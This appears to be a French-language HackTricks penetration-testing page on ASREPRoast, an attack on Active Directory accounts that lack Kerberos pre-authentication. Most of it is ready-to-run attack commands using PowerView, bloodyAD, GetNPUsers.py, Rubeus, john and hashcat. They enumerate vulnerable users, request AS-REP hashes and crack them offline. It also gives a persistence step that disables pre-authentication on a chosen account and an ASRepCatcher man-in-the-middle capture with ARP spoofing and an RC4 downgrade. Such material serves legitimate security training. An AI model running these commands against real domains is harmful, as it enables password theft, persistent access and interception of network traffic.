# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast est une attaque de sécurité qui exploite les utilisateurs qui manquent de l'**attribut requis de pré-authentification Kerberos**. Essentiellement, cette vulnérabilité permet aux attaquants de demander l'authentification d'un utilisateur auprès du Contrôleur de Domaine (DC) sans avoir besoin du mot de passe de l'utilisateur. Le DC répond alors avec un message chiffré avec la clé dérivée du mot de passe de l'utilisateur, que les attaquants peuvent tenter de craquer hors ligne pour découvrir le mot de passe de l'utilisateur.

Les principales exigences pour cette attaque sont :

- **Absence de pré-authentification Kerberos** : Les utilisateurs cibles ne doivent pas avoir cette fonctionnalité de sécurité activée.
- **Connexion au Contrôleur de Domaine (DC)** : Les attaquants ont besoin d'un accès au DC pour envoyer des demandes et recevoir des messages chiffrés.
- **Compte de domaine optionnel** : Avoir un compte de domaine permet aux attaquants d'identifier plus efficacement les utilisateurs vulnérables via des requêtes LDAP. Sans un tel compte, les attaquants doivent deviner les noms d'utilisateur.

#### Énumération des utilisateurs vulnérables (besoin d'identifiants de domaine)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Demander un message AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting avec Rubeus générera un 4768 avec un type de chiffrement de 0x17 et un type de pré-authentification de 0.

### Crackage
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistance

Force **preauth** non requis pour un utilisateur où vous avez des permissions **GenericAll** (ou des permissions pour écrire des propriétés) :
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sans identifiants

Un attaquant peut utiliser une position de l'homme du milieu pour capturer les paquets AS-REP alors qu'ils traversent le réseau sans s'appuyer sur la désactivation de la pré-authentification Kerberos. Cela fonctionne donc pour tous les utilisateurs sur le VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nous permet de le faire. De plus, l'outil force les stations de travail des clients à utiliser RC4 en modifiant la négociation Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
